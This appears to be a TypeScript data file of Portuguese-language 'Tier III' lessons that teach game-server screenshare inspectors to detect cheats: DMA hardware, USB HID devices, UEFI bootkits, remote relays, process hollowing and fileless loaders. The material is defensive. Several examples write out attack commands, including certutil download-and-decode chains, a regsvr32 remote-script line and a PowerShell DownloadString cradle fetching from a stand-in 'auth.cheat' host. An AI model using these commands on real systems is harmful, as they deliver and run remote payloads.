import type { Lesson } from "./types";

const L = (
  id: string,
  title: string,
  categoryId: string,
  intro: string,
  sections: Lesson["sections"],
  checklist: string[]
): Lesson => ({ id, title, categoryId, tier: "tier3", intro, sections, checklist });

export const tier3Lessons: Lesson[] = [
  L("dma-detectar", "DMA — Como Detectar", "privado",
    "Parabéns, você chegou no Tier III. Aqui o xiter não roda .exe — ele pluga uma placa de R$ 8 mil no PCIe e lê sua RAM de outro PC. Scan de disco? Limpinho. Você? Fudido se não souber caçar hardware.",
    [
      {
        kind: "intro",
        heading: "O que é essa porra de DMA?",
        body: "Direct Memory Access via FPGA/PCIe. Placa externa lê a RAM do PC alvo sem deixar processo, sem prefetch, sem Sysmon Event 1. O cheat roda na SEGUNDA máquina.\n\nCompetitive de emulador virou Fórmula 1 de hardware. Se você só olha disco, você é o estagiário que perde pro cara com duas torres na mesa.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Por que o scan não pega",
        body: "171 ScreenS varre o PC alvo. DMA não executa nada no alvo — só lê memória.\n\n• Prefetch: CLEAN\n• Sysmon Event 1: nada de cheat\n• Journal: zero\n\nO rastro tá no HARDWARE e no COMPORTAMENTO. Tier I e II não bastam aqui — bem-vindo ao clube privado.",
        example: "Scan retornou 100% clean, mas o cara flicka 180° em 40ms sem nenhum processo suspeito. Irmão, desde quando o Windows lê memória sozinho? Me mostra a mesa aí.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Sinais indiretos que o otário entrega",
        body: "Ninguém tem aimbot sem processo por magia. Procure:\n\n• Segunda torre/PC na rede (Event 3 LAN, IP 192.168.x.x)\n• Placa PCIe desconhecida no Gerenciador de Dispositivos\n• Cabo HDMI 'estranho' entre GPU e monitor (fuser)\n• Gameplay inumanamente perfeito + scan limpo = combo clássico\n• USB serial conectado (Arduino/Teensy como input relay)",
        example: "Mano, você tem uma placa 'Unknown Device' no PCIe, um cabo HDMI grosso demais e um segundo PC ligado na mesma rede. Isso é setup de streamer ou setup de DMA? Escolhe rápido.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 2 — Área DMA no 171 ScreenS",
        body: "Painel enterprise tem área DMA/USB dedicada. Correlaciona com:\n\n• Lista de hardware PCIe\n• Dispositivos USB serial\n• Flags de anomalia de input\n\nNão leia isolado — DMA + comportamento + contexto da mesa = veredito.",
      },
      {
        kind: "zuera",
        heading: "🤣 O argumento clássico do DMA boy",
        body: "\"É placa de captura, mano. Uso pra stream.\"\n\nPlaca de captura não precisa de FPGA custom, segundo PC lendo RAM, nem fuser HDMI. Streamer legítimo mostra OBS, não torre paralela com cabo serial.",
        example: "Ah sim, captura de tela com leitura de memória via PCIe. Novo meta do Twitch, nunca ouvi falar. Me manda o link do tutorial aí.",
      },
      {
        kind: "veredito",
        heading: "Veredito Tier III — DMA",
        body: "Scan clean + sinais hardware + gameplay suspeito = NÃO é CLEAN.\n\n• Documenta área DMA do scanner\n• Pede foto/vídeo da mesa se regra permitir\n• Escala pro grupo privado se não domina\n• Veredito: SUSPEITO DMA ou BAN conforme regra servidor\n\nTier III existe porque disco mente. Hardware não.",
      },
    ],
    ["Área DMA no 171 ScreenS", "Listar PCIe desconhecidos", "Correlacionar gameplay + scan clean", "Checar rede LAN", "Perguntar setup mesa", "Escalar se necessário"]),
  L("dma-usb-hardware", "DMA & USB Programável", "privado",
    "Arduino no USB não é projeto de escola — é colorbot, input automation e relay de aim. O xiter comprou kit pronto e acha que VID/PID mente.",
    [
      {
        kind: "intro",
        heading: "USB programável = mãos robóticas",
        body: "Arduino Leonardo, Teensy, Pro Micro, Makcu — dispositivos HID programáveis que simulam mouse/teclado com precisão inumana.\n\nNão aparece como cheat.exe. Aparece como dispositivo USB legítimo executando firmware custom.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — USB History",
        body: "No 171 ScreenS, área USB lista histórico de dispositivos conectados.\n\nRed flags:\n• VID/PID de Arduino (2341, 1B4F, 16C0)\n• Serial genérico ou vazio\n• Conectado durante ranked/SS\n• Dispositivo desconectado segundos antes da telagem",
        example: "USB History: Arduino Leonardo — conectado 14:28, desconectado 14:29\nScan pedido 14:30. Que coincidência, hein? Plugou, jogou, tirou na hora da SS?",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Makcu, KMBox e a família PCIe",
        body: "Nomes comerciais mudam toda semana. Não memorize marca — memorize PADRÃO:\n\n• PCIe anômalo + USB serial + aim perfeito\n• Segundo dispositivo de input além do mouse normal\n• Firmware flash recente no dispositivo\n\nCombo DMA kit: placa PCIe + USB serial + fuser HDMI.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Correlacionar USB + DMA area",
        body: "Scanner enterprise cruza USB history com flags DMA.\n\nSe USB serial aparece E área DMA acusa anomalia = hardware cheat confirmado ou altíssima suspeita.\n\nPrint ambas áreas no relatório.",
        example: "Tem Arduino conectado e a área DMA tá gritando. 'É pro projeto de robótica da faculdade'? Mano, qual faculdade ensina aimbot?",
      },
      {
        kind: "veredito",
        heading: "Veredito — USB Hardware",
        body: "USB programável sozinho ≠ ban automático (dev legítimo existe).\n\nMas USB programável + ranked + scan suspeito + desconectou antes da SS = SUSPEITO/BAN.\n\nDocumenta VID/PID, horário conexão, print USB area.",
      },
    ],
    ["USB history completo", "VID/PID suspeitos", "Área DMA correlacionada", "Horário conexão vs SS", "Print hardware", "Regra servidor"]),
  L("uefi-profundo", "UEFI Profundo — Além do Básico", "privado",
    "Tier II te ensinou a olhar ESP. Tier III é quando o bootkit tá tão fundo que Secure Boot off é só a ponta do iceberg. Se você não domina firmware, não telar sozinho — escala.",
    [
      {
        kind: "intro",
        heading: "Bootkit > usermode cheat",
        body: "Cheat em usermode deixa rastro. Bootkit modifica a cadeia de boot ANTES do Windows carregar.\n\nResultado: scan limpo, Sysmon limpo, memória limpa — mas firmware comprometido.\n\nIsso não é Tier II. Isso é chamada de especialista.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Boot chain",
        body: "Sequência: UEFI firmware → bootmgfw.efi → winload.efi → kernel.\n\nBootkit hooka em:\n• bootmgfw.efi modificado na ESP\n• Boot Services (ExitBootServices hook)\n• Variáveis NVRAM estranhas\n• DXE drivers custom na ESP",
        example: "ESP: bootmgfw.efi SHA diferente do stock Windows 11 23H2\nSecure Boot: OFF\nScan UEFI: CRITICAL\n→ Mano, seu bootloader tá customizado. 'Dual boot Linux' não explica hash errado.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ NVRAM e variáveis suspeitas",
        body: "Variáveis UEFI persistem entre boots. Bootkit pode criar vars custom.\n\nFerramentas: chipsec, UEFITool, dump NVRAM offline.\n\nVars desconhecidas + ESP alterada = escalar imediato.",
      },
      {
        kind: "zuera",
        heading: "🤣 'Desativei Secure Boot pro Linux'",
        body: "Dual boot legítimo existe. Mas dual boot não modifica bootmgfw.efi hash.\n\nLinux usa shim/grub separado. Hash de bootmgfw.efi stock é público — compara.",
        example: "Ah, dual boot. Me explica por que o bootmgfw.efi do seu 'Linux' tem assinatura de bootkit conhecido então?",
      },
      {
        kind: "veredito",
        heading: "Quando escalar — regra de ouro",
        body: "Secure Boot OFF + ESP alterada + scan UEFI critical = NÃO opine BAN/CLEAN sozinho se não domina firmware.\n\n• Coleta hash de cada .efi\n• Dump NVRAM se possível\n• Escala Tier III grupo privado\n• Veredito provisório: SUSPEITO BOOTKIT — aguardando especialista",
      },
    ],
    ["Hash bootmgfw.efi", "Comparar com stock", "Scan UEFI critical", "NVRAM dump", "Escalar especialista", "Não banir sem domínio"]),
  L("uefi-esp-analise", "Análise da Partição ESP", "privado",
    "ESP é a gaveta secreta do boot. Xiter mete .efi custom achando que ninguém monta partição de 100MB. Spoiler: montamos.",
    [
      {
        kind: "intro",
        heading: "EFI System Partition — o esconderijo",
        body: "Partição FAT32 ~100MB, sem letra por padrão. Guarda bootloaders .efi.\n\nWindows stock: \\EFI\\Microsoft\\Boot\\bootmgfw.efi\n\nBootkit adiciona: arquivos .efi extras, substitui bootmgfw, injeta DXE driver.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Montar e listar",
        body: "Na SS (admin):\n\n1. mountvol S: /S\n2. dir S:\\EFI\\ /s\n3. Lista TUDO — Microsoft, Boot, OEM, pastas desconhecidas\n\nCompara com imagem clean do MESMO build Windows (23H2, 22H2, etc).",
        example: "Arquivo extra: S:\\EFI\\Boot\\custom.efi — criado há 2 dias\nStock não tem isso. 'Custom' no nome já é confissão, mano.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ SHA cada .efi",
        body: "Para cada .efi encontrado:\n\n• certutil -hashfile arquivo.efi SHA256\n• Compara com hash stock (Microsoft catalog ou repositório clean)\n\nMismatch em bootmgfw.efi = bootkit. Arquivo extra = investigar.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Timestamps e ordem de criação",
        body: "Data de criação/modificação dos .efi na ESP.\n\nBootloader modificado ontem + ban hoje + user jura 'nunca mexi' = mentira documentada.\n\nPrint dir com data visível.",
        example: "custom.efi criado 17/06/2026 03:47. SS pedida 19/06. Você 'nunca mexeu' mas o arquivo nasceu de madrugada?",
      },
      {
        kind: "veredito",
        heading: "Veredito — ESP",
        body: "ESP limpa + hashes stock = OK.\nESP com .efi extra ou hash errado = SUSPEITO BOOTKIT mínimo.\n\nNunca ban só por Secure Boot off. Ban por EVIDÊNCIA de modificação.",
      },
    ],
    ["mountvol S: /S", "Listar todos .efi", "SHA256 cada arquivo", "Comparar stock", "Print com data", "Documentar extras"]),
  L("remote-bypass-deep", "Remote Bypass — Logs 3, Localhost, IP Local", "privado",
    "Remote disfarçado de tráfego local é a arte favorita do xiter esperto. AnyDesk escutando 127.0.0.1 enquanto segundo PC controla via relay? Clássico Tier III.",
    [
      {
        kind: "intro",
        heading: "Remote não é só AnyDesk aberto",
        body: "Tier II pegou AnyDesk visível. Tier III pega:\n\n• Tunnel localhost (127.0.0.1:porta)\n• Relay entre processos locais\n• LAN entre dois PCs (192.168.x.x)\n• IPv6 link-local (::1, fe80::)\n\nO remote 'some' do radar se você só filtra IP externo.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Event 3 localhost",
        body: "Sysmon Event 3 — Network Connect.\n\nFiltro crítico: DestinationIp = 127.0.0.1 ou ::1\n\nProcesso local conectando em porta local = relay ativo.\n\nPadrão: anydesk.exe → 127.0.0.1:5959\nOutro processo escuta mesma porta.",
        example: "Event 3:\nImage: anydesk.exe\nDestination: 127.0.0.1:5959\n→ Relay local ativo. 'Trabalho remoto'? Trabalho remoto em ranked?",
      },
      {
        kind: "tecnica",
        heading: "🕵️ IP local LAN — segunda máquina",
        body: "192.168.x.x, 10.x.x.x entre dois PCs na mesma rede.\n\nSegunda torre controlando a primeira via Parsec/RustDesk/custom tunnel.\n\nCorrelaciona: Event 3 + netstat -ano + área REMOTE do scanner.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Combo Logs + conexão + netstat",
        body: "Workflow:\n\n1. Sysmon Event 3 filtrado (localhost + LAN)\n2. netstat -ano | findstr LISTENING\n3. Área REMOTE 171 ScreenS\n4. Cruza PID → processo → timeline\n\nRemote bypass sem correlacionar = telagem pela metade.",
        example: "netstat: TCP 0.0.0.0:7070 LISTENING — PID desconhecido\nEvent 3: conexão LAN 192.168.1.50\n→ Segunda máquina na rede controlando. Me explica a torre do lado.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Remote Deep",
        body: "Regra servidor manda. Muitos = BAN automático qualquer remote em SS.\n\nMas documenta COMO: sessão ativa, relay localhost, LAN control.\n\nEvidência fraca ('Parsec instalado mas off') ≠ evidência forte ('sessão ativa + Event 3 relay').",
      },
    ],
    ["Event 3 filtro localhost", "Event 3 LAN IPs", "netstat -ano LISTENING", "Área REMOTE scanner", "Correlacionar PID", "Regra servidor"]),
  L("remote-portas", "Portas Suspeitas em Telagem", "privado",
    "1337, 5555, 5938, 7070 — portas que xiter usa porque acha que ninguém roda netstat. Spoiler: rodamos.",
    [
      {
        kind: "intro",
        heading: "Porta custom = backdoor local",
        body: "Processo escutando porta não padrão = serviço de cheat, relay, ou C2 local.\n\nWindows normal não escuta 1337. Cheat escuta.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — netstat na SS",
        body: "CMD admin:\n\nnetstat -ano | findstr LISTENING\n\nAnote: porta, PID, endereço (0.0.0.0 = todas interfaces).\n\nPID → tasklist /FI \"PID eq XXXX\" → nome do processo.",
        example: "TCP 0.0.0.0:1337 — PID 8842\nProcesso: svchost.exe (sem -k servicegroup)\n→ Backdoor local disfarçado. Svchost não escuta 1337, mano.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Portas clássicas de cheat/remote",
        body: "Lista não exaustiva (muda toda semana):\n\n• 1337, 31337 — leet clássico\n• 5555 — ADB/cheat relay\n• 5938 — TeamViewer alt\n• 7070, 8080 — proxy custom\n• 27015+ — game spoof\n\nQualquer LISTENING de processo não-sistema = investigar.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Sysmon Event 3 + porta",
        body: "Event 3 mostra conexões SAINDO. netstat mostra quem ESCUTA.\n\nCombo: processo escuta 1337 + Event 3 conecta em auth IP = cheat ativo.",
      },
      {
        kind: "zuera",
        heading: "🤣 'É porta do meu servidor Minecraft'",
        body: "Minecraft server roda em Java com janela/console visível. Não roda escondido em svchost sem service group.\n\nArgumento burro = suspeita dobrada.",
        example: "Servidor Minecraft invisível na porta 1337 dentro do svchost. Novo modpack, nunca vi. Me manda o IP do server aí.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Portas",
        body: "Porta suspeita + processo suspeito + correlaciona Event 3 = evidência forte.\n\nPorta suspeita sozinha = investigar, não banir direto.\n\nDocumenta netstat completo no relatório.",
      },
    ],
    ["netstat -ano LISTENING", "PID → processo", "Portas conhecidas cheat", "Sysmon Event 3", "Print netstat", "Regra servidor"]),
  L("cheat-generico-privado", "Cheat Genérico — Caça Privada", "privado",
    "Conteúdo que Samuca usa em pins reais do grupo fechado. Não tá no YouTube. Não tá no Tier I. Aqui é caça de cheat privado com método de operação.",
    [
      {
        kind: "intro",
        heading: "Scan clean ≠ CLEAN",
        body: "Cheat privado não tá em lista pública. Scanner genérico pode dar clean.\n\nMétodo Samuca: scan + comportamento + memória + timeline + strings enterprise custom.\n\nConfiar só no result = perder pro xiter que paga R$ 500/mês no privado.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Abordagem combo",
        body: "Ordem de caça:\n\n1. Scan 171 ScreenS completo (todas áreas)\n2. Timeline unificada (Prefetch + Journal + Sysmon)\n3. Dump memória se scan suspeito mas disco limpo\n4. Strings custom enterprise (patterns XOR, auth privado)\n5. Re-scan com patterns atualizados\n6. Veredito com 2+ evidências independentes",
        example: "Pin #8842: scan clean\nDump HD-Player: XOR decode → 'solvynx_auth_v3'\nVeredito: BAN privado — prova em memória, disco limpo de propósito.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Strings custom enterprise",
        body: "171 ScreenS enterprise aceita patterns custom da operação.\n\nAtualiza conforme meta:\n• Nomes de cheat privado da season\n• XOR keys conhecidas\n• URLs de auth custom\n• Stubs de loader não listados\n\nPattern 'solvynx' pegou loader que VT dava 0/72.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Timeline mata veredito",
        body: "Scan clean + CCleaner 14:25 + 200 deletes + scan 14:30 = anti-forense, não clean.\n\nMonta planilha HH:MM | Fonte | Ação. Gap suspeito = delete antes da SS.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Caça Privada",
        body: "Cheat privado exige paciência. Não apressa BAN.\n\n• Mínimo 2 evidências independentes\n• Dump quando disco limpo demais\n• Review no grupo privado se dúvida\n• Documenta strings/patterns que pegaram",
      },
    ],
    ["Scan completo todas áreas", "Timeline unificada", "Dump se necessário", "Strings custom enterprise", "Re-scan patterns", "Review grupo privado"]),
  L("process-hollowing", "Process Hollowing — Detecção Completa", "privado",
    "Process hollowing: path legítimo por fora, malware por dentro. svchost.exe que não é svchost. Tier III porque Tier II só suspeita — aqui você confirma.",
    [
      {
        kind: "intro",
        heading: "O que é hollow",
        body: "Técnica: CreateProcess suspended → NtUnmapViewOfSection → WriteProcessMemory malicious → ResumeThread.\n\nProcesso aparece como notepad.exe, svchost.exe, explorer.exe — path legítimo.\n\nConteúdo de memória = binário completamente diferente.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Sinais clássicos",
        body: "Red flags:\n\n• svchost.exe SEM argumento -k ServiceGroup\n• notepad.exe com janela invisível + conexão rede\n• Processo 'legítimo' com parent PID estranho\n• Event 8 start address fora de módulo conhecido\n• SI: memória unsigned, disco signed (ou vice-versa)",
        example: "svchost.exe — sem -k, sem service group\nSI: memória unsigned\nEvent 8: start address 0x00007FF8A0000000 (fora de ntdll)\n→ Hollow confirmado, mano. Svchost legítimo não faz isso.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Memory vs Disk — a prova",
        body: "Compare:\n\n• SHA do .exe no disco (DIE/certutil)\n• Módulos em memória (System Informer → Modules)\n• Image path vs conteúdo real\n\nMismatch = hollow. Não tem discussão.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ PPID tree e Event 1",
        body: "Event 1 mostra ParentImage. Hollow often spawned por cmd/powershell/loader.\n\nPPID spoof pode esconder parent real — SI process tree revela mismatch.\n\nParent: explorer.exe mas explorer não spawnou (timestamp impossível).",
      },
      {
        kind: "veredito",
        heading: "Veredito — Hollowing",
        body: "Hollow confirmado (memory ≠ disk) = BAN.\n\nSuspeita sem confirmação = escalar Tier III, pedir dump.\n\nPrint SI modules + Event 8 + SHA disk vs memory.",
      },
    ],
    ["PPID tree SI", "Memory vs disk SHA", "Event 8 start address", "svchost sem -k", "Dump confirmação", "Veredito BAN se confirmado"]),
  L("fileless-cmd", "Fileless — CMD Chains", "privado",
    "Cheat que roda só via cmd.exe sem .exe persistente. O xiter acha que sem arquivo não tem prova. Journal, 4104 e Prefetch discordam.",
    [
      {
        kind: "intro",
        heading: "Fileless = sem .exe no disco",
        body: "Payload executado via cmd chains: certutil decode, bitsadmin download, echo pipe pra .bat em memória, mshta, regsvr32 /s /n /u /i:http.\n\nArquivo some. Rastro fica.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Padrão cmd chain",
        body: "Sequência típica:\n\n1. cmd /c certutil -urlcache -split -f URL temp.b64\n2. certutil -decode temp.b64 payload.exe\n3. payload.exe executa e se auto-deleta\n4. Journal: sem .exe persistente\n5. Prefetch: CMD.EXE com spike recente",
        example: "Prefetch: CMD.EXE modificado 14:29\nJournal: certutil activity, sem .exe novo\n4104: vazio (não usou PS)\n→ Fileless via cmd. 'Não rodei nada'? CMD.EXE discorda.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Certutil & bitsadmin logs",
        body: "Certutil deixa rastro em:\n• Prefetch CMD\n• Journal (arquivo temp criado/deletado)\n• Application log (alguns builds)\n\nBitsadmin: BITS transfer logs + prefetch.\n\nBusca 'certutil' e 'bitsadmin' no journal export.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Memória quando disco limpo",
        body: "Fileless puro: payload só em RAM.\n\nDump do processo alvo (emulador) ou cmd.exe parent.\n\nStrings: auth URLs, config aimbot, nomes de cheat.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Fileless CMD",
        body: "CMD prefetch spike + certutil journal + scan strings memória = BAN fileless.\n\nCMD sozinho = investigar contexto (dev roda scripts).\n\nCombo temporal com abertura do jogo = evidência.",
      },
    ],
    ["CMD prefetch horário", "Journal certutil/bitsadmin", "4104 se PS envolvido", "Dump memória", "Timeline cmd → jogo", "Veredito composto"]),
  L("fileless-powershell", "Fileless — PowerShell", "privado",
    "IEX, DownloadString, -enc base64 — o fileless moderno. 4104 é sua melhor amiga se estiver habilitado. Se não estiver, o servidor tá facilitando pro xiter.",
    [
      {
        kind: "intro",
        heading: "PowerShell fileless",
        body: "Payload 100% em memória via PS:\n\n• powershell -enc BASE64\n• IEX (New-Object Net.WebClient).DownloadString\n• Invoke-Expression com cradle ofuscado\n• AMSI bypass via reflection\n\nSem .exe. Com 4104 = confissão completa.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Event 4104",
        body: "Script Block Logging captura payload INTEIRO decodificado.\n\nFiltro: Microsoft-Windows-PowerShell/Operational → Event 4104\n\nDecode offline: base64 do -enc, XOR do ofuscado.",
        example: "powershell -enc JABzAD0ATgBlAHcALQBPAGoAZQBjAHQ...\n4104 decode: DownloadString('http://auth.cheat/private/loader.ps1')\n→ Fileless PS confirmado. '-enc' não esconde nada do 4104.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ AMSI bypass — scan ainda pega",
        body: "Xiter tenta bypass AMSI com ofuscação/reflection.\n\n171 ScreenS scan memória pode achar strings mesmo com AMSI bypass.\n\n4104 + scan strings = combo mortal.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Parent process chain",
        body: "Event 1: quem spawnou powershell?\n\n• explorer → PS = user manual (investigar)\n• cmd → PS → enc = loader chain\n• emulador → PS = muito suspeito\n\nSysmon Event 1 ParentImage + CommandLine.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Fileless PS",
        body: "4104 com payload cheat = BAN direto.\n\n4104 desabilitado + PS prefetch + scan memória strings = BAN composto.\n\nServidor sem 4104 = buraco — documenta no relatório.",
      },
    ],
    ["4104 habilitado?", "Decode -enc offline", "Parent process Event 1", "Scan strings memória", "Sysmon Event 1 PS", "Veredito BAN"]),
  L("fileless-python", "Fileless — Python (py/pythonw)", "privado",
    "pythonw.exe sem janela rodando aimbot em script. O xiter acha que Python é 'linguagem de dev'. Dev não roda pythonw em ranked.",
    [
      {
        kind: "intro",
        heading: "Python fileless",
        body: "Cheat em .py executado via python/pythonw:\n\n• pythonw.exe = sem console (invisível)\n• pip install de libs suspeitas (pyautogui, pymem, keyboard)\n• .py em Temp/AppData deletado após exec\n• Conexão Event 3 pra auth",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Sinais",
        body: "Red flags:\n\n• pythonw.exe no Prefetch (horário ranked)\n• pip cache com packages suspeitos\n• .py em Temp (mesmo deletado — journal)\n• Event 3: pythonw → auth IP\n• Scan strings: pymem, ReadProcessMemory",
        example: "pythonw.exe prefetch 14:30\nTemp journal: aim.py criado/deletado\nEvent 3: pythonw → 185.x.x.x:443\n→ Script cheat fileless. 'É bot de Discord'? Bot de Discord não usa pymem.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ pip cache e scripts",
        body: "%LocalAppData%\\pip\\cache — packages instalados recentemente.\n\nScripts .py em Temp/AppData — journal mostra create/delete.\n\nDIE em .py se sobrou algum.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Fileless Python",
        body: "pythonw + auth Event 3 + strings memória = BAN.\n\npythonw sozinho = contexto (dev legítimo existe).\n\nCombo com horário jogo + scan = evidência.",
      },
    ],
    ["pythonw prefetch", "pip cache packages", "Scripts .py journal", "Event 3 auth", "Scan strings pymem", "Veredito composto"]),
  L("metodos-privados", "Métodos Privados — Grupo Fechado", "privado",
    "Tier III não é curso gravado que envelhece. É operação viva — grupo Discord privado, calls de review, casos reais anonimizados. Bypass evolui toda semana. Conteúdo evolui junto.",
    [
      {
        kind: "intro",
        heading: "Por que existe Tier III",
        body: "Tier I e II são base pública. Tier III é inteligência de operação:\n\n• Bypass que saiu ontem\n• Patterns que pegaram pin real\n• Review ao vivo com Samuca\n• Casos anonimizados do grupo\n\nQuem não entra no grupo perde metade do valor.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Acesso ao grupo",
        body: "Discord Private Tier III:\n\n• Canal de pins pra review\n• Calls semanais de telagem\n• Módulos adicionados conforme meta muda\n• Feedback direto do Samuca\n\nNovo bypass semana X → módulo adicionado só Tier III.",
        example: "Bypass 'ghost inject v4' apareceu terça.\nQuarta: módulo no Tier III.\nQuinta: pattern enterprise atualizado.\nSexta: telador pega no pin real.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Como usar o grupo",
        body: "Não posta pin incompleto. Formato:\n\n1. Scan completo anexado\n2. Timeline resumida\n3. Sua hipótese (CLEAN/SUSPEITO/BAN)\n4. Dúvida específica\n\nPin sem prefetch = 'pede prefetch antes de opinar'.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Métodos Privados",
        body: "Tier III = aplicar Tier I+II + intel privada + review grupo.\n\nNão telar no escuro. Entra no Discord. Participa das calls. Atualiza patterns.\n\nTelador que só assiste aula gravada perde pro xiter que paga dev privado.",
      },
    ],
    ["Entrar grupo Discord", "Participar calls review", "Aplicar Tier I+II base", "Postar pins formato correto", "Feedback Samuca", "Atualizar patterns"]),
  L("labs-privado", "Labs & Review ao Vivo", "privado",
    "Telagem real com mentoria. Você monta veredito, Samuca corrige na hora. Errou? Aprende. Acertou? Próximo pin mais difícil. Gravações exclusivas Tier III.",
    [
      {
        kind: "intro",
        heading: "Lab = pin real simulado",
        body: "Formato:\n\n• Pin anonimizado de caso real\n• Aluno prepara veredito completo\n• Call ao vivo: aluno defende, Samuca corrige\n• Gravação fica no grupo privado\n\nAprendizado 10x mais rápido que vídeo gravado.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Preparar pin",
        body: "Antes da call:\n\n1. Scan 171 ScreenS completo\n2. Timeline unificada\n3. Veredito draft (CLEAN/SUSPEITO/BAN + evidências)\n4. Dúvidas anotadas\n\nPin incompleto = não participa da correção.",
        example: "Lab #12: pin DMA suspeito\nAluno: CLEAN (só olhou scan)\nCorreção: scan clean em DMA = RED FLAG, pedir hardware check\n→ Aluno nunca mais dá CLEAN em scan limpo + gameplay suspeito.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Defender veredito",
        body: "Na call, defende com evidência:\n\n• 'BAN porque Event 8 linha X'\n• 'SUSPEITO porque área DMA + USB serial'\n• 'CLEAN porque 2 evidências negativas + contexto legítimo'\n\n'Feeling' não vale. Print vale.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Labs",
        body: "Errou lab = aprendizado. Anota correção.\n\nRevisa gravação depois.\n\nPróximo lab: aplica correção.\n\nTelador formado em lab erra menos em pin real.",
      },
    ],
    ["Preparar pin completo", "Defender veredito na call", "Anotar correções Samuca", "Revisar gravação", "Aplicar no próximo pin", "Formato evidência numerada"]),
  L("scanner-privado-internals", "171 ScreenS — Internals Private", "privado",
    "Extrair o MÁXIMO do scanner enterprise. Áreas REMOTE, DMA, USB, enterprise strings — cada flag explicada com critério de ban do servidor. Não ler result superficialmente.",
    [
      {
        kind: "intro",
        heading: "Scanner enterprise ≠ scan básico",
        body: "171 ScreenS enterprise tem áreas que scan free não tem:\n\n• REMOTE (sessões ativas, histórico)\n• DMA/USB (hardware anômalo)\n• Enterprise strings (patterns custom)\n• UEFI critical\n• Hidden bypass\n\nLer só 'CLEAN/DIRTY' = telagem amadora.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — Cada área explicada",
        body: "REMOTE: AnyDesk/Parsec/RustDesk — sessão ativa = BAN automático em muitos servidores.\n\nDMA: flags hardware + USB serial correlacionados.\n\nEnterprise strings: patterns XOR/auth custom da operação.\n\nUEFI: critical = escalar bootkit.",
        example: "REMOTE + active session = BAN automático servidor X\nUser: 'trabalho'\n→ Regra manda. Documenta sessão + horário + print.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Quando re-scan",
        body: "Re-scan quando:\n\n• Patterns enterprise atualizados\n• Primeiro scan clean mas suspeita forte\n• Novo bypass conhecido da semana\n• Pin de appeal — comparar com scan original",
      },
      {
        kind: "veredito",
        heading: "Veredito — Internals",
        body: "Integra TODAS áreas no relatório.\n\nNão cita só uma flag. Correlaciona.\n\nScanner é ferramenta — telador pensa. Scanner acusa, telador confirma.",
      },
    ],
    ["Ler todas áreas result", "Enterprise strings custom", "Correlacionar REMOTE+DMA+USB", "Re-scan quando necessário", "Critério ban servidor", "Integrar no relatório"]),
  L("edge-cases-privado", "Edge Cases — Só Private", "privado",
    "Casos limite que separam telador mediano de telador Tier III: VM legítima vs emulador cheat, dual boot real vs bootkit, dev tools vs cheat disfarçado, setup streamer vs setup DMA.",
    [
      {
        kind: "intro",
        heading: "Edge case ≠ falso positivo automático",
        body: "VM, Hyper-V, dev tools, streamer setup — tudo pode ser legítimo.\n\nMas também pode ser disfarce. Tier III aprende CONTEXTO, não checklist cego.",
      },
      {
        kind: "modulo",
        heading: "📚 MÓDULO 1 — VM legítima",
        body: "Hyper-V, VMware, VirtualBox:\n\n• Dev legítimo: Hyper-V ON, WSL, Docker\n• Cheat: VM pra rodar cheat isolado ou emulador nested\n\nDiferencia: nested virtualization + gameplay suspeito + scan flags.",
        example: "User dev legítimo: Hyper-V ON, Visual Studio prefetch, sem gameplay ranked\nUser suspeito: Hyper-V ON, ranked, scan suspeito, nested virt\n→ Contexto manda. Não banir só por VM.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Dual boot vs bootkit",
        body: "Dual boot legítimo: grub/shim, Secure Boot pode estar off, MAS bootmgfw.efi hash stock.\n\nBootkit: bootmgfw.efi modificado, .efi extra, NVRAM suspeita.\n\nHash não mente. Argumento mente.",
      },
      {
        kind: "tecnica",
        heading: "🕵️ Streamer setup vs DMA setup",
        body: "Streamer legítimo: OBS prefetch, placa captura Elgato/Avermedia conhecida, um PC.\n\nDMA setup: FPGA PCIe, fuser HDMI, segundo PC, USB serial, scan clean + aim suspeito.\n\nPergunta setup. Pede foto se regra permitir.",
      },
      {
        kind: "veredito",
        heading: "Veredito — Edge Cases",
